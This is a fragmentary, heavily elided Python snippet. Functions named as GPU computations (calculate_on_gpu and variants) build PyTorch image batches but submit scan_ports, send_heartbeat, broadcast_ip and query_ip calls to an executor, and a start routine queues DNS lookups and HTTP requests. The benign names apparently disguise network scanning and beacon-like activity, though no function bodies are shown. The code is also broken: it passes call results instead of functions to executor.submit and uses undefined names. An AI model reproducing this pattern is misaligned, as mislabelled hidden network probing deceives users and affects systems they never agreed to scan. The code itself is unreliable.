...
def calculate_on_gpu():
    ...
    batch_size = 32
    num_tasks = 128  # Number of tasks to parallelize
    your_task_args = [torch.randn(batch_size, 1, 28, 28) for _ in range(num_tasks)]  # Example batch of 28x28 grayscale images
    
    with torch.no_grad():

        
        futures = []
        for args in your_task_args:
                futures.append(executor.submit(send_heartbeat(), args))
...
def calculate_on_gpu0():
    ...
    with torch.no_grad():
        ...
        futures = []
        for args in your_task_args:
                futures.append(executor.submit(scan_ports(), args))
...
def calculate_on_gpu1():
    ...
    with torch.no_grad():
        ...
        futures = []
        for args in your_task_args:
            futures.append(executor.submit(broadcast_ip(), args))
...
def calculate_on_gpu3():
    ...
    with torch.no_grad():  
        futures = []
        for args in your_task_args:
            futures.append(executor.submit(query_ip(), args))
...
def initiate_start():
    ...
    tasks.append(get_dns_records())
    tasks.append(perform_http_requests())
